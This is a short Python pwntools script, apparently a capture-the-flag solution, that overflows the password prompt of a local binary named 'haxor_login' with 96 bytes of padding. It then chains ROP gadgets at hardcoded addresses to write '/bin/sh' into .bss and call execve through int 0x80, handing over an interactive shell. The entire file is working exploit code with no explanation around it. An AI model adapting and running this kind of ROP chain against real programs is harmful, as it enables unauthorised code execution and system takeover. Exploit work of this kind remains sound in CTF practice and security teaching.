# @method : ROP to gaining execve("/bin/sh",0,0)
# @author : tripoloski
# @link_ref : - https://syscalls.kernelgrok.com/
# @tools    : ropper2 , readelf
from pwn import *
def main():
    r           = process("./haxor_login")
    offset      = 96
    pop_eax     = 0x080b93c6
    pop_ecx_ebx = 0x0806fda1
    pop_edx     = 0x0806fd7a
    mov_edx_eax = 0x0805577b
    bss         = 0x080ebf80
    interupt    = 0x08070340

    payload     = ""
    payload     += "A" * offset
    payload     += p32(pop_eax)
    payload     += "/bin"
    payload     += p32(pop_edx)
    payload     += p32(bss)
    payload     += p32(mov_edx_eax)

    payload     += p32(pop_eax)
    payload     += "/sh\x00"
    payload     += p32(pop_edx)
    payload     += p32(bss+4)
    payload     += p32(mov_edx_eax)


    payload     += p32(pop_eax)
    payload     += p32(11)
    payload     += p32(pop_edx)
    payload     += p32(0)
    payload     += p32(pop_ecx_ebx)
    payload     += p32(0)
    payload     += p32(bss)
    payload     += p32(interupt)

    r.recvuntil("[?] Username : ")
    r.sendline("")
    r.recvuntil("[?] Password for  : ")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()
